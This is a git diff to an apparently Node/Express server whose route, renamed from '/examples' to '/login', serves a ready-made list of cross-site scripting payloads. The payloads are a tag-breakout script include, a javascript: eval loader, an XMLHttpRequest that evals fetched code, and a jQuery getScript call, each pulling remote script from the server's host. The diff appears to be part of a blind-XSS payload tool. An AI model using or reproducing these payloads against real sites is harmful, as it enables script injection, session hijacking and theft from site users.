@@ -93,19 +93,18 @@ async function uploadImage(image) {
   });
 }
 
-app.get("/examples", (req, res) => {
+app.get("/login", (req, res) => {
   res.header("Content-Type", "text/plain");
+  //var url = `http://whoer.net${req.headers["host"]}`;
   //var url = "https://globalcu.org";
   var url = req.protocol + '://' + req.headers['host']
-  //var url = "https://" + req.headers["host"];
+  var url = "https://" + req.headers["host"];
   //var url = `http://globalcu.org${req.headers["host"]}`;
-  var page = "/*"; // This represents a wildcard path
-  //var page = "";
+  //var page = "/*"; // This represents a wildcard path
+  var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
-
   page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
-
   page += `<script>$.getScript("${url}")</script>`;
   res.send(page);
   res.end();
